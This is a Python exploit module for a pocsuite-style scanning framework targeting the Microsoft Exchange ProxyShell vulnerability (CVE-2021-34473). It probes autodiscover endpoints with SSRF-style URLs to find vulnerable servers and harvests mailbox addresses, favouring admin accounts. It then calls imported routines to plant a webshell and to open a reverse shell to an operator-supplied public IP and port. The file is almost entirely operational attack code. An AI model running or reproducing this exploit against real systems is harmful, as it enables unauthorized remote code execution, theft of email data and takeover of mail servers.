"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""
import json
from Framework.Valueconfig import FORMATTIME, ValueStatus
from collections import OrderedDict
import datetime
import random
import string
from urllib.parse import quote, urljoin, urlparse
from Framework.Library.Function.Function.PocSuite.Function import decode_data_input_poc
from Framework.Library.Function.Function.PocSuite.api import POC_SCAN, Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptDict, VUL_TYPE, logger, paths,get_listener_ip, get_listener_port
from Framework.Library.Function.Function.PocSuite.lib.utils import random_str
from Framework.Library.Function.Function.PocSuite.init_pocs.cve_2021_34473.proxyshell_enumerate import ProxyShell, get_emails
from Framework.Library.Function.Function.PocSuite.init_pocs.cve_2021_34473.proxyshell_rce import  attack, exploit_rce


import requests  # python-requests, eg. apt-get install python3-requests
import sys, os
import re
from configvalue import *

class DemoPOC(POCBase):
    vulID = 'CVE-2021-34473'  # ssvid
    version = '1.0'
    author = ['asdcxsd']
    vulDate = '26/08/2021'
    createDate = '2021/09/03'
    updateDate = '2021/09/03'
    references = ['https://github.com/dmaasland/proxyshell-poc']
    name = 'Microsoft Exchange Server Remote Code Execution'
    appPowerLink = {"typescan" : POC_SCAN.EXPLOITS.DIR,
                "language"  : [POC_SCAN.LANGUAGE.PYTHON]}
    appName = 'exchange-proxyshell-cve-2021-34473'
    appVersion = 'CVE-2021-34473'
    vulType = VUL_TYPE.COMMAND_EXECUTION
    desc = '''Run command code execute from website have vulnerablity'''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    pocDesc = '''CVSS SCORE 10.0, (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)    )'''
    url_result = {}
    def _verify(self, update=True):
        if update== True:
            config_input, Referer = decode_data_input_poc(self.headers['Referer'])
            try:
                self.url = config_input['Input']['RECON_WEBAPP']
            except Exception as e:
                raise Exception("Error " +  self.appName +   " :" + str(e))
        result = {}
        self.result_url = []
        url_detect = ["/autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com",  "/autodiscover/autodiscover.json?@test.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@test.com"] 
        flag = ["Microsoft.Exchange.Clients.Owa2.Server.Core.OwaADUserNotFoundException", "Exchange MAPI/HTTP Connectivity Endpoint"]
        for url in self.url:
            for d_url in url_detect:
           
                r = requests.get(url + d_url)
                if any([ (f in r.text) for f in flag]):
                    try:
                        self.result_url.append(url)
                        break
                    except Exception as e:
                        logger.warn(str(e))
        self.emails = []
        urls = self.result_url.copy();
        self.result_url = []
        for url in urls : 
            try:
                ans = ""
                proxyshell = ProxyShell(url)
                email = get_emails(proxyshell)
                email = [e.text for e in email]
                List = [ s.split('@')[-1] for s in email]
                endmail = max(set(List), key = List.count)
                for em in email:
                    emn = em.lower()
                    if not endmail in em:  continue
                    ans = em
                    if "admin" in  emn or "administrator" in emn :
                        break
                if (ans != ""):
                    self.emails.append(ans)
                    self.result_url.append(url)
            except Exception as e:
                pass
        if len(self.result_url ) > 0:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['url'] = self.result_url
                result['VerifyInfo']['email'] = self.emails
        if update:
            return self.parse_output(result)
        else:
            return result

    def _attack(self):
        config_input, Referer = decode_data_input_poc(self.headers['Referer'])
        try:
            self.url = config_input['Input']['RECON_WEBAPP']
            #host_check_connect = config_input['Config']['Cf_Host_Check_Connect']# http://x.x.x.x:pppp
        except Exception as e:
            raise Exception("Error " +  self.appName +   " :" + str(e))
        self._verify(update=False)
        
        cmd = "run"
        data_attack = ""
        data_email = ""
        data_url = ""
        for  url, email in zip(self.result_url, self.emails):
            try:
                res = attack(url, email)
                if res != False:
                    data_attack = url
                    data_email = email
                    data_url = res
            except Exception as e:
                print("Error attack with poc proxyshell", e)
        if len(data_attack) > 0:
            result = {}
            result['ShellInfo'] = {}
            result['ShellInfo']['url'] =  data_attack 
            result['ShellInfo']['email'] =  data_email 
            result['ShellInfo']['shell'] =  data_url 
            
            result['ShellInfo']['info'] = '''proxyshell RCE ''' 
            return self.parse_output(result)
        return self.parse_output(False)

    def _shell(self):
        #getdata input
        result = {}
        result['ShellInfo'] = {
                'Status': 'Success'
            }
        try:
            config_input,  Referer = decode_data_input_poc(self.headers['Referer'])
            try:
                self.url = config_input['Input']['EXPLOIT_POCS']
                lhost_running = config_input['Config']['Cf_PublicIP']
                lport_running = config_input['Config']['Cf_PublicPort']
            except Exception as e:
                raise Exception("Error " +  self.appName +   " :" + str(e))
            #self._verify(update=False)
            self.url = self.url[0]['result']['ShellInfo']
            result['info'] = self.url
            result['info_reverse'] = {
                "PublicIP": lhost_running,
                "PublicPort" : lport_running
            }
            url = self.url['shell']
            try:
                exploit_rce(url,lhost_running, lport_running )
            except Exception as e:
                result["Error"] = e
            return self.parse_output(result)
        except  Exception as e:
            if type(e) == requests.exceptions.ReadTimeout:
                return self.parse_output(result)
            print("Error run proxyshell", self.name, e)
            pass
        return self.parse_output(False)
    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
